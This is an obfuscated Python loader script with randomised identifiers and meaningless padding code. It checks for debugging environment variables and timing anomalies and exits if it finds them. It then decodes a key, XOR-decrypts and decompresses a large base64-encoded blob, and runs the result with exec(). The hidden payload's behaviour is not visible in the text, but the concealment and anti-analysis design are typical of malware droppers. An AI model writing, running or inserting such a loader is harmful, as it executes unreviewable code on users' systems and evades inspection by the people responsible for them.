
import base64 as dAowcrGs, zlib as NKaZWJiW, marshal as DzMLKWMq, hashlib as __h, os as yDZhNkOZ, sys as wQnGeekE, time as FXYAoQQJ

fZAknibS = 5241
BjQTJoKt = '1GPC3sCJsfL3'
HsvnbSRC = lambda x: x

def acbWYCkk():
    x = 0
    for i in range(5):
        x += i
    return x


lYdWUVas = [1, 38, 51, 48, 62, 55, 25, 61, 54, 59, 96, 99, 1, 51, 62, 38, 1, 38, 32, 59, 60, 53, 28, 38, 107, 22]
OFnWjBgH = 82
gsaOamHs = ''.join(chr(b ^ OFnWjBgH) for b in lYdWUVas)
fXhkaSWe = __h.sha256(gsaOamHs.encode()).digest()

def RCLQgocj():
    suspicious = ['PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONVERBOSE']
    for v in suspicious:
        if yDZhNkOZ.environ.get(v):
            wQnGeekE.exit(1)
    t1 = FXYAoQQJ.time()
    FXYAoQQJ.sleep(0.1)
    t2 = FXYAoQQJ.time()
    if t2 - t1 > 0.5:
        wQnGeekE.exit(1)

RCLQgocj()

rIZDRULB_data = ["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"]
rIZDRULB_key = ["8xEAAACSvGDmU9kx2ekfBcD7hzz4Yg=="]

rIZDRULB_data_joined = ''.join(rIZDRULB_data)
rIZDRULB_key_joined = ''.join(rIZDRULB_key)

xiwTxyFM = dAowcrGs.b64decode(rIZDRULB_key_joined)
JzhzwUEq = DzMLKWMq.loads(xiwTxyFM)
hMKxAqej = bytes([b ^ fXhkaSWe[i % len(fXhkaSWe)] for i, b in enumerate(JzhzwUEq)]).decode()

rIZDRULB_enc = dAowcrGs.b64decode(rIZDRULB_data_joined)
TsogsxoN = bytes([b ^ ord(hMKxAqej[i % len(hMKxAqej)]) for i, b in enumerate(rIZDRULB_enc)])
uhVQAPsB = NKaZWJiW.decompress(TsogsxoN)

if 1 == 2:
    print("This never runs")
while False:
    print("Nor does this")
try:
    assert 1 == 0
except:
    pass

exec(uhVQAPsB)
